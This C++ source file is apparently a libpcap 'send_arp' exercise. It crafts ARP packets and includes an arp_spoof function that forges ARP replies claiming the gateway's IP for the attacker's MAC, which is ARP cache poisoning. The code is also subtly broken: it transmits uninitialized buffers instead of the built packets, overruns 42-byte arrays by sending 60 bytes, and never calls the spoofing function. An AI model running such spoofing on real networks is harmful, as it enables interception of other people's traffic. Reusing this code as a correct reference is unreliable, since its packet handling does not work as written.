#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <cstdlib>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <unistd.h>

struct EthernetInfo {
	u_char DMac[6];
	u_char SMac[6];
	u_short Type;
};

struct ArpInfo {
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	u_char sender_mac[6];
	u_char sender_ip[4];
	u_char target_mac[6];
	u_char target_ip[4];
};

typedef struct {
	struct EthernetInfo ethernet_header;
	struct ArpInfo arp_header;
} L2;

void usage();
void create_arp_header(struct pcap_pkthdr *header, const u_char *packet, uint8_t *mac_address, uint8_t *sender_ip);
void get_my_mac(uint8_t* mac_address, char* dev);
void extract_ip(uint8_t* source_ip, char* argv);
void send_broadcast_packet(pcap_t* handle, uint8_t *sender_mac);
void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip);

int main(int argc, char* argv[])
{
	if (argc != 4) {
		usage();
		//return -1;
	}

	uint8_t sender_ip[4] = { 0 };
	uint8_t target_ip[4] = { 0 };
	uint8_t host_mac[6] = { 0 };
	uint8_t sender_mac[6] = { 0 };

	extract_ip(sender_ip, argv[2]);
	extract_ip(target_ip, argv[3]);

	char* dev = argv[1];
	//char* dev = "eth0"; // using debug
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, 42, 1, 1000, errbuf);  // change BUFSIZE -> ONLY 42
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_next_ex(handle, &header, &packet);
	//if (res == 0) continue;
	//if (res == -1 || res == -2) break;

	printf("host device mac address : ");
	get_my_mac(host_mac, dev);
	create_arp_header(header, packet, host_mac, sender_ip); // call function print basic info
	send_broadcast_packet(handle, sender_mac);
	pcap_close(handle);

	return 0;
}

void usage() {
	printf("usage : send_arp <interface> <sender ip> <target ip>\n");
	// ex : send_arp eth0 192.168.43.71 192.168.43.1
}

void create_arp_header(struct pcap_pkthdr *header, const u_char *packet, uint8_t *mac_address, uint8_t *sender_ip) {
	L2* l2_layer = const_cast<L2*>(reinterpret_cast<const L2*>(packet));

	for (int i = 0; i < 6; i++) {
		l2_layer->ethernet_header.DMac[i] = 0xff;
		l2_layer->ethernet_header.SMac[i] = mac_address[i];
	}
	l2_layer->ethernet_header.Type = htons(0x0806);
	l2_layer->arp_header.hardware_type = htons(0x0001);
	l2_layer->arp_header.protocol_type = htons(0x0800);
	l2_layer->arp_header.hardware_size = 0x06;
	l2_layer->arp_header.protocol_size = 0x04;
	l2_layer->arp_header.opcode = htons(0x0001);

	for (int i = 0; i < 6; i++) {
		l2_layer->arp_header.sender_mac[i] = l2_layer->ethernet_header.SMac[i];
		//memcpy(l2_layer->arp_header.sender_mac[i], l2_layer->ethernet_header.SMac[i], 6);
		l2_layer->arp_header.target_mac[i] = 00;
	}

	for (int i = 0; i < 4; i++) {
		l2_layer->arp_header.sender_ip[i] = 00;
		l2_layer->arp_header.target_ip[i] = sender_ip[i];
	}
}

void send_broadcast_packet(pcap_t* handle, uint8_t *sender_mac) {
	u_char broadcast_arp[42];

	// send one broadcast packet
	if (pcap_sendpacket(handle, broadcast_arp, 60) != 0) {
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
		return;
	}

	printf("========== REQUEST ==========\n");

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		printf("%u bytes captured\n", header->caplen);

		L2* broad_packet = const_cast<L2*>(reinterpret_cast<const L2*>(packet));

		// check arp type
		if (ntohs(broad_packet->ethernet_header.Type) == 0x0806) {
			for (int i = 0; i < 6; i++) {
				sender_mac[i] = broad_packet->arp_header.sender_mac[i];
			}
		}
		printf("==============================\n");
	}
}

void extract_ip(uint8_t* source_ip, char* argv) {
	char* split_ip;

	split_ip = strtok(argv, ".");
	source_ip[0] = strtoul(split_ip, nullptr, 10);

	for (int i = 1; i < 4; i++) {
		split_ip = strtok(NULL, ".");
		source_ip[i] = strtoul(split_ip, nullptr, 10);
	}
}

void get_my_mac(uint8_t* mac_address, char* dev) {
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, dev);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
		int i;
		for (i = 0; i < 6; ++i) {
			mac_address[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
			printf("%02x", mac_address[i]);
			if (i != 5) printf(":");
		}
		puts("\n");
	}
}

void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip) {
	u_char arp_spoof[42];

	L2* spoof_packet = const_cast<L2*>(reinterpret_cast<const L2*>(packet));

	for (int i = 0; i < 6; i++) {
		spoof_packet->ethernet_header.DMac[i] = sender_mac[i];
		spoof_packet->ethernet_header.SMac[i] = host_mac[i];
	}
	spoof_packet->ethernet_header.Type = htons(0x0806);
	spoof_packet->arp_header.hardware_type = htons(0x0002);
	spoof_packet->arp_header.protocol_type = htons(0x0800);
	spoof_packet->arp_header.hardware_size = 0x06;
	spoof_packet->arp_header.protocol_size = 0x04;
	spoof_packet->arp_header.opcode = htons(0x02);

	for (int i = 0; i < 6; i++) {
		spoof_packet->arp_header.sender_mac[i] = host_mac[i];
		spoof_packet->arp_header.target_mac[i] = sender_mac[i];
	}

	for (int i = 0; i < 4; i++) {
		spoof_packet->arp_header.sender_ip[i] = target_ip[i];
		spoof_packet->arp_header.target_ip[i] = sender_ip[i];
	}

	//memcpy(arp_spoof, &spoof_packet, sizeof(spoof_packet));
	if (pcap_sendpacket(handle, arp_spoof, 60) != 0) {
		fprintf(stderr, "\nError arp spoofing packet: \n", pcap_geterr(handle));
		return;
	}
}
